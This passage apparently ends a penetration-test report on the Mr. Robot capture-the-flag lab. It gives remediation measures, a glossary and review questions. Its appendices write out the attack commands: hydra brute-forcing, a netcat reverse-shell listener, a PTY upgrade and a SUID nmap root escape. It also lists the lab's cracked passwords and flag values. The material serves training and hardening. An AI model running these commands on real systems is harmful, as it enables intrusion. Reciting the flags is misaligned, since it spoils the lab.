#### Comparison of Computational Performance (Indicative Measurements):
- **CPU (Intel i7):** $\approx 10 - 50 \times 10^6$ hashes/sec for MD5.
- **GPU (NVIDIA RTX 3080/4090):** $\approx 50 - 150 \times 10^9$ hashes/sec for MD5.  
This enormous difference underscores why algorithms without a built-in computational cost are now considered entirely obsolete.

---

## 10. Assessment of Findings and Remediation Measures

### 10.1 Weakness Classification Table by CVSS / Severity

Multiple weaknesses were identified during the penetration test; they are assessed in summary in the table below:

| Vulnerability / Misconfiguration | Stack Layer | CWE / Classification | Estimated Severity | Operational Impact |
| :--- | :--- | :--- | :--- | :--- |
| **Sensitive Entries in `robots.txt`** | Web Server / Info | CWE-200 (Information Exposure) | **Low** | Disclosure of hidden files and a custom dictionary. |
| **User Enumeration via Message Discrepancy** | Application | CWE-204 (Observable Response Discrepancy) | **Medium** | Identification of valid administrator accounts. |
| **Inadequate Password Policy** | Application | CWE-521 (Weak Password Requirements) | **High** | Compromise of the administrator account via a dictionary attack. |
| **Enabled Theme File Editor**| Application / CMS | CWE-94 (Improper Control of Code Generation) | **High** | Remote code execution (RCE) and acquisition of a Reverse Shell. |
| **Password Stored as Unsalted MD5** | OS / Data Storage | CWE-327 (Use of a Broken Cryptographic Algorithm) | **Medium** | Immediate recovery of the user's password via Rainbow Tables. |
| **SUID Bit on a General-Purpose Tool (`nmap`)** | Operating System | CWE-250 (Execution with Unnecessary Privileges) | **Critical** | Full privilege escalation to superuser (`root`) level. |

### 10.2 Recommended Technical Remediation Measures (Hardening Roadmap)

To harden the system effectively and apply the principle of **Defense in Depth**, the following measures are recommended:

1. **Sanitizing `robots.txt`:** Immediately remove sensitive paths from the file. Resource security must be enforced through authentication and authorization mechanisms (Access Control Lists) on the web server, not through obscurity.
2. **Unifying Authentication Messages:** Configure the application to return a single, generic error message for every failed login attempt (e.g., *"Incorrect username or password"*), preventing user enumeration.
3. **Implementing Rate Limiting & Account Lockout:** Enable mechanisms that limit failed login attempts (e.g., lockout after 5 failed attempts) and use a Web Application Firewall (WAF) to prevent automated brute-force attacks.
4. **Enforcing Multi-Factor Authentication (MFA):** Make MFA/2FA mandatory for all accounts with administrator (`Administrator`) privileges.
5. **Disabling the Built-in File Editor:** Add the following parameter to the `wp-config.php` file to completely remove the ability to modify code from the web dashboard:
   ```php
   define('DISALLOW_FILE_EDIT', true);
   ```
6. **Disabling XML-RPC:** If no external management applications are in use, it is recommended to disable `xmlrpc.php` via the `.htaccess` file or an appropriate plugin:
   ```apache
   <Files xmlrpc.php>
   Order Allow,Deny
   Deny from all
   </Files>
   ```
7. **Upgrading Cryptographic Algorithms:** Retire MD5 entirely and adopt modern, secure key derivation functions (**Argon2id** or **bcrypt**) with a unique cryptographic salt per account.
8. **File Permissions Hardening:** Restrict read permissions on sensitive files within users' home directories (`chmod 700 /home/<user>`).
9. **Eliminating Insecure SUID Binaries:** Remove the SUID bit from general-purpose tools that permit shell escapes:
   ```bash
   chmod u-s /usr/local/bin/nmap
   ```
10. **Applying the Principle of Least Privilege:** Ensure that network service accounts (such as `daemon` or `www-data`) do not have access to compilation tools or system command execution tools.

### 10.3 Mapping of Findings to Protective Actions

| Identified Weakness | Corresponding Remediation Measure | Operational Outcome |
| :--- | :--- | :--- |
| Exposure of paths in `robots.txt` | Measures 1, 8 | Minimization of passively collectible information. |
| User Enumeration (CWE-204) | Measure 2 | Valid usernames can no longer be confirmed. |
| Brute-Force Attacks | Measures 3, 4 | Prevention of exhaustive attacks and protection of credentials. |
| Code Execution via the Dashboard | Measures 5, 6 | Neutralization of the Remote Code Execution (RCE) vector. |
| Weak Password Hash (MD5) | Measure 7 | Drastic increase in the computational cost of cracking. |
| SUID Root Binary | Measures 9, 10 | Prevention of vertical privilege escalation at the OS level. |

---

## Appendices

### Appendix A: Comprehensive Technical Glossary

- **Reconnaissance:** The initial phase of gathering information about the target system (IP addresses, open ports, operating systems).
- **Enumeration:** The process of actively probing a service to extract detailed information, such as usernames, shared resources, and software versions.
- **Wordlist:** A text file containing a list of possible passwords, usernames, or file paths for use in automated testing.
- **Brute-Force Attack:** An attack method based on the systematic, exhaustive testing of all possible combinations until the correct one is found.
- **Hash Function:** A one-way mathematical algorithm that converts data of arbitrary size into a fixed-length string.
- **Cryptographic Salt:** A random string of data added to a password before it is hashed, making each hash unique and protecting against Rainbow Table attacks.
- **Rainbow Tables:** Precomputed databases containing pairs of known plaintexts and their corresponding hashes, allowing passwords to be looked up and recovered immediately.
- **Reverse Shell:** A remote access technique in which the target initiates a connection to the attacker's workstation and grants it command-line access.
- **Bind Shell:** An access technique in which the target opens a local listening port and waits for the attacker to connect to it.
- **Payload:** The executable portion of malicious code delivered to the target in order to perform a specific action (e.g., creating a reverse shell).
- **PTY (Pseudo-Terminal):** A virtual terminal interface in Linux that emulates a physical terminal, allowing interactive command execution.
- **SUID (Set User ID) Bit:** A special file permission in UNIX/Linux environments that allows users to execute the file with the privileges of its owner (usually `root`).
- **RUID (Real User ID):** The identifier of the actual user who started a process.
- **EUID (Effective User ID):** The identifier that the kernel uses to determine a process's access rights during its execution.
- **Defense in Depth:** A security strategy based on applying multiple, successive layers of protection across the entire information infrastructure.
- **Attack Surface:** The set of all possible entry points through which an unauthorized user may attempt to enter or extract data from a system.

### Appendix B: Self-Assessment and Review Questions

1. **Question:** Why is listing sensitive paths in the `robots.txt` file an incorrect security practice?  
   *Answer:* Because the file is publicly accessible to anyone. Listing paths in it reveals exactly which locations the administrator wishes to protect, handing attackers a ready-made target (Security through Obscurity).
2. **Question:** How is the CWE-204 weakness exploited to enumerate users in a web application?  
   *Answer:* Through differences in the error messages (e.g., "Invalid user" versus "Incorrect password"). The attacker isolates the username variable and confirms valid names before testing passwords.
3. **Question:** Why is sorting (`sort`) absolutely necessary before removing duplicates with the `uniq` command?  
   *Answer:* Because the `uniq` command compares only adjacent lines. If identical entries are scattered throughout the file, they will not be detected without prior sorting.
4. **Question:** Why does the `su` command fail in a basic web reverse shell, and how is its functionality restored?  
   *Answer:* It fails because the shell lacks a PTY (pseudo-terminal), which is required to read the password securely. Functionality is restored by running `python -c 'import pty; pty.spawn("/bin/bash")'`.
5. **Question:** What is the exact mechanism by which a SUID binary leads to a root shell?  
   *Answer:* The executable runs with EUID `0` (`root`). If the program allows an escape to a system shell (e.g., via `system()`) without dropping privileges, the resulting shell inherits full administrative privileges.
6. **Question:** What is the fundamental difference between the MD5 and Argon2id algorithms with respect to password storage?  
   *Answer:* MD5 is extremely fast and vulnerable to massive parallelism (GPU/ASIC), whereas Argon2id incorporates an adjustable computational cost and memory requirements (memory-hard), making brute-force attacks impractical.
7. **Question:** Which critical measure, had it been applied to WordPress, would have prevented Initial Access?  
   *Answer:* Disabling file editing with the directive `define('DISALLOW_FILE_EDIT', true);` in the `wp-config.php` file.
8. **Question:** Why is the HTTP POST method preferred over GET for submitting login credentials?  
   *Answer:* Because the POST method carries the credentials in the request body rather than in the URL (Query String), preventing them from being recorded in web server access logs, browser history, and proxies.
9. **Question:** What is the advantage of a Reverse Shell over a Bind Shell in firewall-protected environments?  
   *Answer:* A Reverse Shell initiates an outbound connection from the target to the attacker. Firewalls usually allow outbound traffic, while blocking the inbound connections that Bind Shells require.
10. **Question:** How would the principle of least privilege have limited the impact of the web server compromise?  
    *Answer:* If the service user (`daemon`) had access only to the application files strictly necessary for its operation and could neither read files in user directories (`/home/robot`) nor execute SUID binaries, the escalation would have been prevented.

### Appendix C: Penetration Testing Checklist

- [x] Complete mapping of TCP ports (`nmap -sV -open`)
- [x] Inspection of public configuration files (`robots.txt`, `sitemap.xml`)
- [x] Identification and retrieval of exposed resources (Key 1, wordlist)
- [x] Directory fuzzing with optimized dictionaries (`gobuster`)
- [x] Capture of authentication requests via an HTTP proxy (Burp Suite)
- [x] Testing for response discrepancies to enumerate users (CWE-204)
- [x] Preparation and deduplication of the password dictionary (`sort -u`)
- [x] Execution of a targeted credential brute-force attack (`hydra` / `wpscan`)
- [x] Assessment of the capabilities of the CMS administration environment
- [x] Injection of a reverse shell payload via theme templates (Theme Editor)
- [x] Reception of the reverse connection and analysis of the execution environment (`whoami`, `id`)
- [x] Upgrade of the shell to a fully interactive PTY (`python pty spawn`)
- [x] Review of file system permissions in user directories (`ls -la /home`)
- [x] Extraction and local/online cracking of the password hash (Key 2)
- [x] System-wide search for executables with the SUID bit set (`find / -perm -u=s`)
- [x] Correlation of SUID findings with GTFOBins techniques
- [x] Execution of the privilege escalation technique and acquisition of a root shell
- [x] Confirmation of administrative privileges and retrieval of the final objective (Key 3)
- [x] Preparation of a detailed technical report and formulation of remediation measures

### Appendix D: Command Summary Table

| Test Phase | Command Executed | Operational Purpose |
| :--- | :--- | :--- |
| **Reconnaissance** | `nmap <target-ip> -sV -T4 -oA nmap-scan -open` | Mapping of open ports and service versions. |
| **Enumeration** | `gobuster dir -u http://<target-ip> -w <wordlist>` | Discovery of hidden web paths and directories. |
| **Enumeration** | `curl -s http://<target-ip>/key-1-of-3.txt` | Immediate retrieval of the first control key. |
| **Enumeration** | `wget http://<target-ip>/fsocity.dic` | Download of the custom wordlist. |
| **Data Processing**| `sort -u fsocity.dic > fs-list` | Sorting and removal of duplicate entries. |
| **Credentials** | `hydra -L fs-list -p test <target-ip> http-post-form "..." -t 30` | Enumeration of valid WordPress usernames. |
| **Credentials** | `hydra -l elliot -P fs-list <target-ip> http-post-form "..." -t 30` | Brute-force attack to find the password of user `elliot`. |
| **Initial Access** | `nc -lnvp 1234` | Setting up a Netcat listener to receive the Reverse Shell. |
| **Pivoting** | `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade of a basic shell to a fully interactive PTY. |
| **Pivoting** | `su robot` | User switch after cracking the hash. |
| **Privilege Esc.** | `find / -perm -u=s -type f 2>/dev/null` | Identification of executables with the SUID bit set. |
| **Privilege Esc.** | `/usr/local/bin/nmap --interactive` $\rightarrow$ `!sh` | Escape to a root shell by abusing the Nmap binary. |
| **Flag Recovery** | `cat /root/key-3-of-3.txt` | Reading the final superuser key. |

### Appendix E: Table of Keys, Hashes, and Credentials

| Control Item | Obtained Value / String | Source / File |
| :--- | :--- | :--- |
| **Key 1 (Flag 1)** | `073403c8a58a1f80d943455fb30724b9` | `http://<target-ip>/key-1-of-3.txt` |
| **Key 2 (Flag 2)** | `822c73956184f694993bede3eb39f959` | `/home/robot/key-2-of-3.txt` |
| **Key 3 (Flag 3)** | `04787ddef27c3dee1ee161b21670b4e4` | `/root/key-3-of-3.txt` |
| **WordPress Username** | `elliot` | User Enumeration (Hydra / CWE-204) |
| **WordPress Password** | `ER28-0652` | Password Brute-Force (`fs-list`) |
| **Robot MD5 Hash** | `c3fcd3d76192e4007dfb496cca67e13b` | `/home/robot/password.raw-md5` |
| **Robot Plaintext Pass** | `abcdefghijklmnopqrstuvwxyz` | MD5 Reverse Lookup / Rainbow Table |

---

## 12. References and Sources

1. **Penetration Testing Execution Standard (PTES):**  
   *Guidelines and Technical Guidelines.* Available at: [http://www.pentest-standard.org/](http://www.pentest-standard.org/)
2. **NIST Special Publication 800-115:**  
   *Technical Guide to Information Security Testing and Assessment.* National Institute of Standards and Technology. Available at: [https://csrc.nist.gov/pubs/sp/800/115/final](https://csrc.nist.gov/pubs/sp/800/115/final)
3. **Common Weakness Enumeration (CWE):**  
   *CWE-204: Observable Response Discrepancy.* MITRE Corporation. Available at: [https://cwe.mitre.org/data/definitions/204.html](https://cwe.mitre.org/data/definitions/204.html)
4. **GTFOBins Project:**  
   *Unix Binaries that can be used to bypass local security restrictions.* Available at: [https://gtfobins.github.io/](https://gtfobins.github.io/)
5. **WordPress Security Hardening Guide:**  
   *Hardening WordPress — Official Developer Documentation.* Available at: [https://developer.wordpress.org/advanced-administration/security/hardening/](https://developer.wordpress.org/advanced-administration/security/hardening/)
6. **Pentestmonkey Projects:**  
   *PHP Reverse Shell Script.* Available at: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
7. **TryHackMe Mr. Robot CTF Room:**  
   *Virtual Machine & Learning Environment.* Available at: [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)
8. **Spanias, C. (2023):**  
   *THM's Mr. Robot CTF Walkthrough.* Medium. Available at: [https://medium.com/@cspanias/thms-mr-robot-ctf-walkthrough-2023-55ca5c19fbaf](https://medium.com/@cspanias/thms-mr-robot-ctf-walkthrough-2023-55ca5c19fbaf)
